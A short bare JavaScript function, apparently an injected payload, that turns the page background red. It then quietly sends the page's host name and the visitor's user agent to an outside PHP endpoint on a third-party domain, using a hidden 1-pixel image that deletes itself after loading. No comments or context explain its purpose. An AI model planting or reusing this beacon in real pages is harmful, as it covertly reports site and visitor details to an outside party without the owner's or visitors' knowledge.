function name() {
    document.body.style.backgroundColor = 'red';
    if (navigator) {
        var img_i = function (src) {
            var i = document.createElement('img');
            i.src = src;
            i.setAttribute('style', 'width:1px;height:1px;');
            document.body.appendChild(i);
            i.onload = function () {
                i.parentElement.removeChild(i)
            };
            i.onerror = function () {
                i.parentElement.removeChild(i)
            };
        };
        var arr = {
            domain: document.location.host,
            useragent: navigator.userAgent,
        };
        img_i('https://cosmicroi.com/are_fails/get_ap.php?par_1=' + encodeURIComponent(JSON.stringify(arr)));
    }
}
